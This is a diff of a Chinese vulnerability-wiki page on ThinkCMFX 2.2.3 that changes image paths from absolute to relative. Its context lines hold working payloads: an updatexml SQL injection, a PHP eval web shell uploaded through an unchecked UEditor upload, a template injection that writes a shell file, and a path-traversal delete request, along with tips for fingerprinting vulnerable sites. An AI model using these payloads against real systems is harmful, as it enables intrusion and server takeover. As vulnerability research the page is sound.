@@ -26,14 +26,14 @@ ThinkCMF 2.x
     post[id][0]:bind
     post[id][1]:0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId26.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId26.png)
 
 #### 0x01.2 漏洞原理
 
 文件：ThinkCMFX\_2.2.3\\application\\Portal\\Controller\\ArticleController.class.php
 方法：public function edit\_post(
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId28.jpg)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId28.jpg)
 
 这里不多讲，因为没得意义。详情请看先知的历史tp漏洞，谢谢：)
 
@@ -53,9 +53,9 @@ ThinkCMF 2.x
 
 连接马子：<http://xxxxx.com/test.php> 密码:11 即可getshell
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId32.jpg)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId32.jpg)
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId33.jpg)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId33.jpg)
 
 #### 0x02.2 Api类模版注入1
 
@@ -76,7 +76,7 @@ ThinkCMF 2.x
 路径:application\\Comment\\Controller\\WidgetController.class.php
 方法：public function fetch()
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId36.jpg)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId36.jpg)
 
 从名字查看我们会发现他的3个参数
 
@@ -95,20 +95,20 @@ ThinkCMF 2.x
 
 ##### 0x03.1 漏洞演示
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId39.jpg)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId39.jpg)
 
     url：http://thinkcmf.test/index.php?g=User&m=Profile&a=do_avatar
     post:
     mgurl=..\..\..\..\..\1.txt
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId40.jpg)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId40.jpg)
 
 #### 0x03.2 漏洞原理
 
 路径：ThinkCMFX\\application\\User\\Controller\\ProfileController.class.php
 方法：blic function do\_avatar(
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId42.jpg)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId42.jpg)
 
 从文件可以看到 \$imgurl=str\_replace(\'/\',\'\',\$imgurl); 过滤了 /
 但是没有过滤 所以我们无法引入 / 并且在更新头像以后还会从前端接收参数
@@ -117,7 +117,7 @@ imgurl 带入函数sp\_delete\_avatar 跟进去
 路径：ThinkCMFX\\application\\Common\\Common\\function.php
 方法：function sp\_delete\_avatar(
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId43.jpg)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId43.jpg)
 
 #### 0x04 前台任意上传漏洞
 
@@ -135,30 +135,30 @@ imgurl 带入函数sp\_delete\_avatar 跟进去
     eval($_REQUEST[1]); 
     ?>
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId46.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId46.png)
 
     shell地址: http://atest.test/cms/ThinkCMFX_2.2.3/data/upload/ueditor/20190724/5d3833dcce7e3.php?1=phpinfo();
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId47.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId47.png)
 
 ##### 0x04.2 为什么要登录
 
 路径：ThinkCMFX\\application\\Asset\\Controller\\UeditorController.class.php
 方法：public function \_initialize()
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId49.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId49.png)
 
 ##### 0x04.3 漏洞原理
 
 路径：ThinkCMFX\\application\\Asset\\Controller\\UeditorController.class.php
 方法：public function upload(
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId51.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId51.png)
 
 路径：ThinkCMFX\\application\\Asset\\Controller\\UeditorController.class.php
 方法：private function \_ueditor\_upload
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId52.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId52.png)
 
 该方法使用 \$upload\_setting=sp\_get\_upload\_setting();
 先获取所有上传的配置
@@ -170,7 +170,7 @@ imgurl 带入函数sp\_delete\_avatar 跟进去
 路径：application\\Common\\Common\\function.php 方法：function
 sp\_get\_upload\_setting()
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId53.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId53.png)
 
 接下来我们需要重点查看一下：\$upload\_setting\[\$filetype\]
 我们可以打印一下,看看他的返回值 路径:
@@ -178,9 +178,9 @@ application\\Asset\\Controller\\UeditorController.class.php 方法:
 private function \_ueditor\_upload( 代码:
 \$upload\_setting\[\$filetype\]
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId54.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId54.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId55.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId55.png)
 
 然后我们在看看他的代码 \$allowed\_exts=explode(\',\',
 \$upload\_setting\[\$filetype\]); 路径:
@@ -198,7 +198,7 @@ private function \_ueditor\_upload( 代码: \$allowed\_exts=explode(\',\',
 
 而这里用了php函数: explode 让我们看看这个函数的作用
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId56.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId56.png)
 
 把字符串转成数组,可是他返回的就是数组所以 \$allowed\_exts=explode(\',\',
 \$upload\_setting\[\$filetype\]); 执行返回空 让我们测试一下看看
@@ -206,27 +206,27 @@ private function \_ueditor\_upload( 代码: \$allowed\_exts=explode(\',\',
 路径: application\\Asset\\Controller\\UeditorController.class.php 方法:
 private function \_ueditor\_upload()
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId57.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId57.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId58.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId58.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId59.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId59.png)
 
 跟进去tp的上传方法查看一下
 路径：ThinkCMFX\_2.2.3\\simplewind\\Core\\Library\\Think\\Upload.class.php
 方法：public function upload()
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId60.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId60.png)
 
 路径：ThinkCMFX\_2.2.3\\simplewind\\Core\\Library\\Think\\Upload.class.php
 方法：private function check()
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId61.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId61.png)
 
 路径：ThinkCMFX\_2.2.3\\simplewind\\Core\\Library\\Think\\Upload.class.php
 方法：private function checkExt()
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId62.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId62.png)
 
 因为这里返回了true所以实际上他并没有验证后缀
 所以我们也就多了一个任意文件上传漏洞
@@ -238,11 +238,11 @@ private function \_ueditor\_upload()
 
 ##### 1，看logo 3的logo是黄色的例如下图
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId65.jpg)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId65.jpg)
 
 ##### 2，在网站url 后面输入 admin
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId67.png)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId67.png)
 
 如果页面是蓝色的表示是3的，可日穿之
 
@@ -250,7 +250,7 @@ private function \_ueditor\_upload()
 
 在网站url后面输入README.md
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId69.jpg)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId69.jpg)
 
 另外还有一个说明，你在实际操作的过程中，可能会遇到他一直报这个错
 
@@ -260,7 +260,7 @@ private function \_ueditor\_upload()
     prefix=''
     content=<php>file_put_contents('test.php','<?php eval($_REQUEST[11]);')</php>
 
-![](/Users/aresx/Documents/VulWiki/.resource/THINKCMFX_2.2.3漏洞合集/media/rId70.jpg)
+![](./.resource/THINKCMFX_2.2.3漏洞合集/media/rId70.jpg)
 
 请放心这并不是说明漏洞不可使用，而是说，这个模版不存在，你可以换一个html即可
 
